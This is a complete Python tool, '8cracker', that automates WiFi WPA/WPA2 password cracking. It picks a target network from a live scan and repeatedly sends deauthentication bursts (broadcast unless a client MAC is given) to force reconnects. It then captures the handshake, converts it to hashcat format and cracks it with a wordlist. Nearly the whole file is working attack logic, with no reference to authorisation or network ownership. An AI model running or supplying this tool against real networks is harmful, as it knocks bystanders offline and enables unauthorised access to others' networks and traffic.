#!/usr/bin/env python3
"""
8cracker - WiFi WPA/WPA2 handshake cracking toolkit (Python front-end).

A single, distro-portable Python CLI that wires together the standard
open-source tooling:

  * airodump-ng   - capture the WPA handshake / PMKID
  * aireplay-ng   - deauthentication to force a handshake
  * hcxpcapngtool - convert the capture to hashcat's -m 22000 format
  * hashcat       - crack the hash via its OpenCL backend (GPU-agnostic:
                    works on any OpenCL-capable device: AMD, NVIDIA, Intel)

The heavy lifting stays on those well-tested C tools; this script only drives
the pipeline (subprocess) and adds distro-aware dependency handling so it runs
on Arch, Debian/Ubuntu, Fedora, openSUSE, Alpine, etc. without editing scripts.

Subcommands:
  capture        Capture a handshake/PMKID to captured_packet-01.cap
  extract        Convert the capture to hash/captured_packet.hc22000
  crack          Crack hash/captured_packet.hc22000 with a wordlist (OpenCL)
  show           Show already-cracked passwords from the potfile
  install-deps   Print (or run) the distro-specific install command

All working files (capture, hash, potfile) are stored under
~/.cache/8cracker (override with CRACKER_DIR) so the tool locates them
regardless of the current directory it is launched from.
"""

import argparse
import glob
import os
import re
import shutil
import signal
import subprocess
import sys
import time

# Banner (printed at the start of each run).
figlet_string = r"""
  ___                      _
 ( _ )  ___ _ __ __ _  ___| | _____ _ __
 / _ \ / __| '__/ _` |/ __| |/ / _ \ '__|
| (_) | (__| | | (_| | (__|   <  __/ |
 \___/ \___|_|  \__,_|\___|_|\_\___|_|
version 1.1
"""
# All working files live under a fixed, per-user cache directory so the tool
# works no matter where it is launched from (e.g. after a system-wide install).
# Override with the CRACKER_DIR environment variable if desired.
def _work_dir():
    base = os.environ.get("CRACKER_DIR")
    if not base:
        base = os.environ.get("XDG_CACHE_HOME") or os.path.join(os.path.expanduser("~"), ".cache")
    d = os.path.join(base, "8cracker")
    os.makedirs(d, exist_ok=True)
    return d


WORK_DIR = _work_dir()
CAPTURE_BASE = os.path.join(WORK_DIR, "captured_packet")
CAPTURE_CAP = f"{CAPTURE_BASE}-01.cap"
HASH_DIR = os.path.join(WORK_DIR, "hash")
HASH_FILE = os.path.join(HASH_DIR, "captured_packet.hc22000")
POTFILE = os.path.join(HASH_DIR, "captured_packet.potfile")
DEFAULT_WORDLIST = "rockyou.txt"

# Capture tuning: how long to keep trying, and how often/hard to deauth.
# A complete handshake needs the client's M2/M4 frames, which often only show
# up after several reconnect attempts, so we loop instead of firing once.
MAX_CAPTURE_SECONDS = 180   # overall budget before giving up
DEAUTH_COUNT = 5            # deauth frames per burst (keep it modest)
DEAUTH_INTERVAL = 8         # seconds between deauth bursts

# Distro -> package manager + dependency package names.
DEP_PACKAGES = {
    "pacman": ["intel-compute-runtime", "ocl-icd", "hashcat", "hcxtools", "aircrack-ng"],
    "apt": ["intel-opencl-icd", "ocl-icd-libopencl1", "hashcat", "hcxtools", "aircrack-ng"],
    "dnf": ["intel-compute-runtime", "ocl-icd", "hashcat", "hcxtools", "aircrack-ng"],
    "zypper": ["intel-compute-runtime", "ocl-icd", "hashcat", "hcxtools", "aircrack-ng"],
    "apk": ["opencl-intel", "opencl", "hashcat", "hcxtools", "aircrack-ng"],
}


def detect_distro():
    """Return the package manager command for the running distro, or None."""
    for pm in ("pacman", "apt-get", "dnf", "zypper", "apk"):
        if shutil.which(pm):
            return pm
    return None


def install_command(pm):
    if pm == "pacman":
        return f"sudo pacman -S {' '.join(DEP_PACKAGES['pacman'])}"
    if pm == "apt":
        return f"sudo apt-get update && sudo apt-get install -y {' '.join(DEP_PACKAGES['apt'])}"
    if pm == "dnf":
        return f"sudo dnf install -y {' '.join(DEP_PACKAGES['dnf'])}"
    if pm == "zypper":
        return f"sudo zypper install -y {' '.join(DEP_PACKAGES['zypper'])}"
    if pm == "apk":
        return f"sudo apk add {' '.join(DEP_PACKAGES['apk'])}"
    return None


def require(*tools):
    """Abort with a helpful message if any required tool is missing."""
    missing = [t for t in tools if shutil.which(t) is None]
    if missing:
        pm = detect_distro()
        print(f"[-] Missing required tool(s): {', '.join(missing)}")
        cmd = install_command(pm) if pm else None
        if cmd:
            print(f"[?] Install them with: {cmd}")
        else:
            print("[?] Could not detect your distro's package manager. "
                  "Install: aircrack-ng, hcxtools, hashcat, ocl-icd, and an OpenCL runtime.")
        sys.exit(1)


def run(args, check=True):
    print(f"[*] $ {' '.join(args)}")
    return subprocess.run(args, check=check)


def _parse_aps(csv_path):
    """Parse airodump-ng's AP list from its CSV into a list of dicts.

    airodump's CSV has a fixed column layout; BSSID/channel/Power never contain
    commas, but the ESSID can, so we read those fields by position.
    """
    aps = []
    if not os.path.exists(csv_path):
        return aps
    try:
        with open(csv_path, "r", encoding="utf-8", errors="replace") as f:
            lines = f.read().splitlines()
    except OSError:
        return aps

    start = None
    for i, line in enumerate(lines):
        if line.startswith("BSSID"):
            start = i
            break
    if start is None:
        return aps

    for line in lines[start + 1:]:
        if line.strip() == "":
            break  # blank line separates APs from stations
        cols = line.split(",")
        if len(cols) < 14:
            continue
        bssid = cols[0].strip()
        if not bssid:
            continue
        aps.append({
            "bssid": bssid,
            "channel": cols[3].strip(),
            "power": cols[8].strip(),
            "essid": cols[13].strip(),
        })
    return aps


def _is_monitor(iface):
    """Return True if the interface is already in monitor mode (via sysfs type)."""
    try:
        with open(os.path.join("/sys/class/net", iface, "type"), "r") as f:
            return int(f.read().strip()) == 803  # ARPHRD_IEEE80211_MONITOR
    except OSError:
        return False


def _list_wireless_interfaces():
    """Return [(interface, driver, is_monitor), ...] for wireless NICs (sysfs)."""
    found = []
    net = "/sys/class/net"
    if not os.path.isdir(net):
        return found
    for iface in sorted(os.listdir(net)):
        if not (os.path.exists(os.path.join(net, iface, "wireless")) or
                os.path.exists(os.path.join(net, iface, "phy80211"))):
            continue
        driver = ""
        drv = os.path.join(net, iface, "device", "driver")
        if os.path.islink(drv):
            driver = os.path.basename(os.readlink(drv))
        found.append((iface, driver, _is_monitor(iface)))
    return found


def _start_monitor(iface):
    """Enable monitor mode with airmon-ng and return the monitor interface name.

    If the interface is already in monitor mode (e.g. an already-created *mon
    interface), leave it as-is so we don't spawn a duplicate wlanXmonmon.
    """
    if _is_monitor(iface):
        return iface
    out = subprocess.run(["airmon-ng", "start", iface], capture_output=True, text=True)
    if out.stdout:
        print(out.stdout, end="")
    if out.stderr:
        print(out.stderr, end="", file=sys.stderr)
    mon = None
    for line in (out.stdout + out.stderr).splitlines():
        if "monitor" in line.lower():
            m = re.search(r"([A-Za-z0-9]+mon)", line)
            if m:
                mon = m.group(1)
                break
    return mon or (iface + "mon")


def _has_handshake(cap_path, bssid):
    """Return True if the capture already contains a usable handshake for BSSID.

    We prefer hcxpcapngtool (the same engine `extract` uses): if it actually
    writes a non-empty hash, `extract` will succeed. As a secondary signal we
    look for both EAPOL M2 and M4 frames (a complete 4-way exchange). Falls back
    to aircrack-ng's network listing if hcxpcapngtool is unavailable.
    """
    if not os.path.exists(cap_path):
        return False
    tmp_hash = os.path.join(WORK_DIR, "check.hc22000")
    try:
        if os.path.exists(tmp_hash):
            os.remove(tmp_hash)
        res = subprocess.run(
            ["hcxpcapngtool", "-o", tmp_hash, cap_path],
            capture_output=True, text=True,
        )
        if os.path.exists(tmp_hash) and os.path.getsize(tmp_hash) > 0:
            return True
        out = res.stdout + res.stderr
        m2 = re.search(r"EAPOL M2 messages \(total\):\s*(\d+)", out)
        m4 = re.search(r"EAPOL M4 messages \(total\):\s*(\d+)", out)
        if m2 and int(m2.group(1)) > 0 and m4 and int(m4.group(1)) > 0:
            return True
    except (OSError, subprocess.SubprocessError):
        pass
    # Fallback: aircrack-ng's network listing ("WPA (N handshake)").
    try:
        empty_wl = os.path.join(WORK_DIR, "empty.wl")
        open(empty_wl, "a").close()
        res = subprocess.run(
            ["aircrack-ng", "-b", bssid, cap_path, "-w", empty_wl],
            capture_output=True, text=True,
        )
        out = (res.stdout + res.stderr).lower()
        m = re.search(r"\(\s*(\d+)\s+handshake", out)
        return bool(m and int(m.group(1)) > 0)
    except (OSError, subprocess.SubprocessError):
        return False


def cmd_capture(args):
    require("airmon-ng", "airodump-ng", "aireplay-ng")
    if os.geteuid() != 0:
        print("[-] Capture needs root. Re-run with sudo.")
        sys.exit(1)

    # Optionally stop processes that interfere with monitor mode.
    if args.kill:
        print("[+] Killing processes that conflict with monitor mode...")
        run(["airmon-ng", "check", "kill"])

    # Choose the wireless adapter to use.
    if args.interface:
        mon_iface = args.interface
    else:
        adapters = _list_wireless_interfaces()
        if not adapters:
            print("[-] No wireless interfaces were found.")
            print("    Plug in your adapter and make sure its driver is loaded, then retry.")
            sys.exit(1)
        print("\n[+] Available WiFi adapters:")
        for i, (iface, driver, mon) in enumerate(adapters, 1):
            tag = "[monitor]" if mon else "[managed]"
            print(f"  {i:2d}) {iface:<12} {driver or '(unknown driver)':<20} {tag}")
        print("      NOTE: choosing a [managed] adapter puts it into monitor mode,")
        print("      which disconnects it from any network it is currently on (e.g. wlan0).")
        while True:
            choice = input("\n[?] Enter the NUMBER of the adapter to use: ").strip()
            if not choice.isdigit():
                print("[-] Please enter a number from the list.")
                continue
            idx = int(choice) - 1
            if idx < 0 or idx >= len(adapters):
                print("[-] Number out of range.")
                continue
            base_iface = adapters[idx][0]
            if not adapters[idx][2]:
                print(f"[!] {base_iface} is [managed]; switching it to monitor mode")
                print(f"    will drop its current connection. Continue? [y/N] ", end="")
                if input().strip().lower() not in ("y", "yes"):
                    print("[-] Pick a [monitor] adapter (e.g. a USB *mon) to keep wlan0 online.")
                    continue
            break
        print(f"[+] Using adapter {base_iface} ({adapters[idx][1] or 'unknown driver'}).")
        mon_iface = _start_monitor(base_iface)
        print(f"[+] Monitor-mode interface: {mon_iface}")

    print("\n" + "=" * 64)
    print("  8cracker - capture a WPA/WPA2 handshake")
    print("=" * 64)
    print("  STEP 1  A live scan will now open.")
    print("          Read the list of WiFi networks (APs) and pick a TARGET.")
    print("  STEP 2  Inside the scan window, press  'q' twice to STOP scanning.")
    print("  STEP 3  You will then choose the target from a numbered list.")
    print("=" * 64)
    input("[+] Press Enter to START the live scan... ")

    scan_prefix = os.path.join(WORK_DIR, "scan")
    scan_csv = f"{scan_prefix}-01.csv"
    scan = subprocess.Popen(
        ["airodump-ng", "-w", scan_prefix, "--output-format", "csv", mon_iface]
    )
    try:
        scan.wait()
    except KeyboardInterrupt:
        scan.send_signal(signal.SIGINT)
        scan.wait()

    aps = _parse_aps(scan_csv)
    # Scan artifacts are temporary; remove them so only the real capture remains.
    for ext in ("-01.csv", "-01.cap", "-01.kismet.csv", "-01.log.csv", "-01.pcap"):
        try:
            os.remove(scan_prefix + ext)
        except OSError:
            pass

    if not aps:
        print("[-] No access points were captured.")
        print("    Make sure the adapter is in monitor mode and wait a little")
        print("    longer in the scan window before pressing 'q', then retry.")
        sys.exit(1)

    print("\n[+] Detected access points:")
    for i, ap in enumerate(aps, 1):
        essid = ap["essid"] or "<hidden>"
        print(f"  {i:2d}) {essid:<28} BSSID {ap['bssid']:<20} CH {ap['channel'] or '?':<3} PWR {ap['power']}")

    while True:
        choice = input("\n[?] Enter the NUMBER of the target to capture: ").strip()
        if not choice.isdigit():
            print("[-] Please enter a number from the list above.")
            continue
        idx = int(choice) - 1
        if idx < 0 or idx >= len(aps):
            print("[-] Number out of range.")
            continue
        target = aps[idx]
        break

    bssid = target["bssid"]
    channel = target["channel"]
    if not channel:
        channel = input("[?] Enter the Channel (CH) for that AP: ").strip()

    print(f"\n[+] Target : BSSID {bssid}  CH {channel}")
    # Remove any stale capture files so airodump writes a fresh -01.cap
    # (airodump auto-increments the suffix if a file already exists, which would
    # otherwise leave the real capture in -02.cap while we report -01.cap).
    for stale in glob.glob(os.path.join(WORK_DIR, "captured_packet-*")):
        try:
            os.remove(stale)
        except OSError:
            pass

    # Build the aireplay-ng deauth command. Targeting a specific client (-c) is
    # cleaner (fewer stray deauths that can reset the AP's EAPOL state); without
    # one we deauth the broadcast so any associated client is forced to reconnect.
    deauth_cmd = ["aireplay-ng", "-0", str(DEAUTH_COUNT), "-a", bssid]
    if args.client:
        deauth_cmd += ["-c", args.client]
    deauth_cmd.append(mon_iface)

    print(f"[+] Capturing handshake to {CAPTURE_CAP} ...")
    print(f"    Auto-stops when a full handshake is seen (budget {MAX_CAPTURE_SECONDS}s).")
    print("    Press Ctrl+C to stop early (the best capture so far is kept).")
    cap = subprocess.Popen(
        ["airodump-ng", "--bssid", bssid, "-c", channel, "-w", CAPTURE_BASE, mon_iface]
    )
    deadline = time.time() + args.timeout
    got = False
    try:
        while time.time() < deadline:
            time.sleep(DEAUTH_INTERVAL)
            print("[+] Sending deauth burst to force a reconnect / handshake...")
            run(deauth_cmd, check=False)
            time.sleep(2)
            if _has_handshake(CAPTURE_CAP, bssid):
                got = True
                print("[+] Handshake detected in capture.")
                break
        cap.send_signal(signal.SIGINT)
        cap.wait()
    except KeyboardInterrupt:
        print("\n[!] Aborted by user.")
        cap.send_signal(signal.SIGINT)
        cap.wait()

    if os.path.exists(CAPTURE_CAP):
        if got or _has_handshake(CAPTURE_CAP, bssid):
            print(f"[+] Capture with handshake saved to {CAPTURE_CAP}. Next: 8cracker extract")
        else:
            print(f"[+] Capture saved to {CAPTURE_CAP}, but no complete handshake was")
            print("    detected yet. Try again (a client must reconnect), or deauth a")
            print("    specific client with --client <MAC> to get a cleaner handshake.")
    else:
        print("[-] Capture file not found. A handshake may not have been captured.")


def cmd_extract(args):
    require("hcxpcapngtool")
    if not os.path.exists(CAPTURE_CAP):
        print(f"[-] {CAPTURE_CAP} not found. Run 'capture' first.")
        print("    Note: capture and extract must run as the same user (e.g. both with sudo).")
        sys.exit(1)
    os.makedirs(HASH_DIR, exist_ok=True)
    run(["hcxpcapngtool", "-o", HASH_FILE, CAPTURE_CAP])
    if os.path.exists(HASH_FILE) and os.path.getsize(HASH_FILE) > 0:
        print(f"[+] Hash extracted to {HASH_FILE}")
        print("[+] Preview:")
        print(open(HASH_FILE, "r", encoding="utf-8", errors="replace").read())
    else:
        print("[-] Extraction failed. Ensure a full handshake or PMKID was captured.")


def cmd_crack(args):
    require("hashcat")
    if not os.path.exists(HASH_FILE):
        print(f"[-] {HASH_FILE} not found. Run 'extract' first.")
        sys.exit(1)
    wordlist = args.wordlist
    if not os.path.exists(wordlist):
        print(f"[-] Wordlist {wordlist} not found.")
        print(f"[?] Generate one with: gen-wordlist --chars ... --output {wordlist}")
        sys.exit(1)
    # -m 22000 = WPA-PBKDF2-PMKID+EAPOL, -a 0 = dictionary, OpenCL backend.
    run(["hashcat", "-m", "22000", "-a", "0",
         "--potfile-path", POTFILE, HASH_FILE, wordlist])
    print("[+] Done. Show results with: show")


def cmd_show(args):
    require("hashcat")
    if not os.path.exists(HASH_FILE):
        print(f"[-] {HASH_FILE} not found. Run 'extract' first.")
        sys.exit(1)
    run(["hashcat", "-m", "22000", "--show", "--potfile-path", POTFILE, HASH_FILE],
        check=False)


def cmd_install_deps(args):
    pm = detect_distro()
    if pm is None:
        print("[-] Could not detect a supported package manager.")
        print("    Install manually: aircrack-ng, hcxtools, hashcat, ocl-icd, OpenCL runtime.")
        return
    cmd = install_command(pm)
    print(f"[+] Detected package manager: {pm}")
    print(f"[+] To install dependencies:\n    {cmd}")
    if args.yes:
        subprocess.run(cmd, shell=True, check=False)


def build_parser():
    p = argparse.ArgumentParser(description="WiFi WPA/WPA2 cracking toolkit (OpenCL)")
    sub = p.add_subparsers(dest="command", required=True)

    c = sub.add_parser("capture", help="Capture handshake to captured_packet-01.cap")
    c.add_argument("--interface", nargs="?", const="", default=None,
                   help="Wireless interface to use directly; if given with no value, "
                        "show the adapter picker (skips auto-detection of the name)")
    c.add_argument("--kill", action="store_true",
                   help="Kill processes that conflict with monitor mode (airmon-ng check kill)")
    c.add_argument("--client", default=None,
                   help="Client MAC to deauth (cleaner handshake); omit for broadcast deauth")
    c.add_argument("--timeout", type=int, default=MAX_CAPTURE_SECONDS,
                   help=f"Maximum capture time in seconds (default {MAX_CAPTURE_SECONDS})")
    c.set_defaults(func=cmd_capture)

    sub.add_parser("extract", help="Convert capture to hash/captured_packet.hc22000").set_defaults(func=cmd_extract)

    k = sub.add_parser("crack", help="Crack the hash with a wordlist (OpenCL)")
    k.add_argument("--wordlist", default=DEFAULT_WORDLIST)
    k.set_defaults(func=cmd_crack)

    sub.add_parser("show", help="Show cracked passwords").set_defaults(func=cmd_show)

    i = sub.add_parser("install-deps", help="Print/run distro install command")
    i.add_argument("--yes", action="store_true", help="Actually run the install")
    i.set_defaults(func=cmd_install_deps)

    return p


def main():
    args = build_parser().parse_args()
    print(figlet_string)
    args.func(args)


if __name__ == "__main__":
    main()
